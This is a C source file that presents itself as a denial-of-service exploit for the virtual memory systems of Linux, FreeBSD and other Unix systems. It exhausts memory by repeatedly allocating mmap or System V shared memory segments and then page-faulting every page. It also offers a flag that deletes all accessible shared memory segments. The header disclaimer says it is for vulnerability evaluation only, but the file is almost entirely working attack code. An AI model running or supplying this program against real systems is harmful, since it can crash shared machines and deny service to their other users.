/*
 * This program can be used to exploit DoS bugs in the VM systems or utility
 * sets of certain OS's.
 *
 * Common problems:
 * 1. The system does not check rlimits for mmap and shmget (FreeBSD)
 * 2. The system never bothers to offer the ability to set the rlimits for
 *    virtual memory via shells, login process, or otherwise. (Linux)
 * 3. b. The system does not actually allocate shared memory until a page fault
 *       is triggered (this could be argued to be a feature - Linux, *BSD)
 *    a. The system does not watch to make sure you don't share more memory 
 *       than exists. (Linux, Irix, BSD?)
 * 4. With System V IPC, shared memory persists even after the process is
 *    gone. So even though the kernel may kill the process after it exhausts all
 *    memory from page faults, there still is 0 memory left for the system.
 *    (All)
 *
 * This program should compile on any architecture. SGI Irix is not
 * vulnerable. From reading The Design and Implementation of 4.4BSD it sounds
 * as if the BSDs should all be vulnerable. FreeBSD will mmap as much memory
 * as you tell it. I haven't tried page faulting the memory, as the system is
 * not mine. I'd be very interested to hear about OpenBSD...
 *
 * This program is provided for vulnerability evaluation ONLY. DoS's aren't
 * cool, funny, or anything else. Don't use this on a machine that isn't
 * yours!!!
 */
#include <stdio.h>
#include <errno.h>
#include <sys/ipc.h>
#include <sys/shm.h> /* redefinition of LBA.. PAGE_SIZE in both cases.. */
#ifdef __linux__
#include <asm/shmparam.h>
#include <asm/page.h>
#endif
#include <sys/types.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <sys/mman.h>

int len;

#define __FUXX0R_MMAP__

/* mmap also implements the copy-on-fault mechanism, but because the only way
 * to easily exploit this is to use anonymous mappings, once the kernel kills
 * the offending process, you can recover. (Although swap death may still
 * occurr */
/* #define __FUXX0R_MMAP__ */

/* Most mallocs use mmap to allocate large regions of memory. */
/* #define __FUXX0R_MMAP_MALLOC__ */


/* Guess what this option does :) */
#define __REALLY_FUXX0R__  

/* From glibc 2.1.1 malloc/malloc.c */
#define DEFAULT_MMAP_THRESHOLD (128 * 1024) 

#ifndef PAGE_SIZE
# define PAGE_SIZE 4096
#endif

#ifndef SHMSEG
# define SHMSEG 256
#endif

#if defined(__FUXX0R_MMAP_MALLOC__)
void *mymalloc(int n)
{
    if(n <= DEFAULT_MMAP_THRESHOLD)
	n = DEFAULT_MMAP_THRESHOLD + 1;
    return malloc(n);
}

void myfree(void *buf)
{
    free(buf);
}
#elif defined(__FUXX0R_MMAP__)
void *mymalloc(int n)
{
    int fd;
    void *ret;
    fd = open("/dev/zero", O_RDWR);
    ret = mmap(0, n, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    close(fd);
    return (ret == (void *)-1 ? NULL : ret);
}
void myfree(void *buf)
{
    munmap(buf, len);
}

#elif defined(__FUXX0R_SYSV__)
void *mymalloc(int n)
{
    char *buf;
    static int i = 0;
    int shmid;
    i++; /* 0 is IPC_PRIVATE */
    if((shmid = shmget(i, n, IPC_CREAT | SHM_R | SHM_W)) == -1)
    {
#if defined(__irix__)
    	if (shmctl (shmid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
#endif
	
	return NULL;	
    }
    if((buf = shmat(shmid, 0, 0)) == (char *)-1)
    {
#if defined(__irix__)
    	if (shmctl (shmid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
#endif
	return NULL;
    }

#ifndef __REALLY_FUXX0R__
    if (shmctl (shmid, IPC_RMID, NULL))
    {
	perror("shmctl");
    }
#endif

    return buf;
}

void myfree(void *buf)
{
    shmdt(buf);
}
#endif

#ifdef __linux__
void cleanSysV()
{
    struct shmid_ds shmid;
    struct shm_info shm_info;
    int id;
    int maxid;
    int ret;
    int shid;
    maxid = shmctl (0, SHM_INFO, (struct shmid_ds *) &shm_info);
    printf("maxid %d\n", maxid);
    for (id = 0; id <= maxid; id++) 
    {
	if((shid = shmctl (id, SHM_STAT, &shmid)) < 0)
	    continue;

	if (shmctl (shid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
	printf("id %d has %d attachments\n", shid, shmid.shm_nattch);
	shmid.shm_nattch = 0;
	shmctl(shid, IPC_SET, &shmid);
	if(shmctl(shid, SHM_STAT, &shmid) < 0)
	{
	    printf("id %d deleted sucessfully\n", shid);
	}
	else if(shmid.shm_nattch == 0)
	{
	    printf("Still able to stat id %d, but has no attachments\n", shid);
	}
	else
	{
	    printf("Error, failed to remove id %d!\n", shid);
	}	

    }
}
#endif

int main(int argc, char **argv)
{
    int shmid;
    int i = 0;
    char *buf[SHMSEG * 2];
    int max;
    int offset;
    if(argc < 2)
    {
	printf("Usage: %s <[0x]size of segments>\n", argv[0]);
#ifdef __linux__
	printf("    or %s --clean (destroys all of IPC space you have permissions to)\n", argv[0]);
#endif
	exit(0);
    }

#ifdef __linux__
    if(!strcmp(argv[1], "--clean"))
    {
	cleanSysV();
	exit(0);
    }
#endif 
    
    len = strtol(argv[1], NULL, 0);
    for(buf[i] = mymalloc(len); i < SHMSEG * 2 && buf[i] != NULL; buf[++i] = mymalloc(len))
	;

    max = i;
    perror("Stopped because");
    printf("Maxed out at %d %d byte segments\n", max, len);
#if defined(__FUXX0R_SYSV__) && defined(SHMMNI)
    printf("Despite an alleged max of %d (%d per proc) %d byte segs. (Page "
	    "size: %d), \n", SHMMNI, SHMSEG, SHMMAX,  PAGE_SIZE); 
#endif
    
#ifdef __REALLY_FUXX0R__
    fprintf(stderr, "Page faulting alloced region... Have a nice life!\n");
    for(i = 0; i < max; i++)
    {
	for(offset = 0; offset < len; offset += PAGE_SIZE)
	{
	    buf[i][offset] = '*';
	}
	printf("wrote to %d byes of memory, final offset %d\n", len, offset);
    }
    // never reached :(
#else
    for(i = 0; i <= max; i++)
    {
	myfree(buf[i]);
    }
#endif
    exit(42);
}

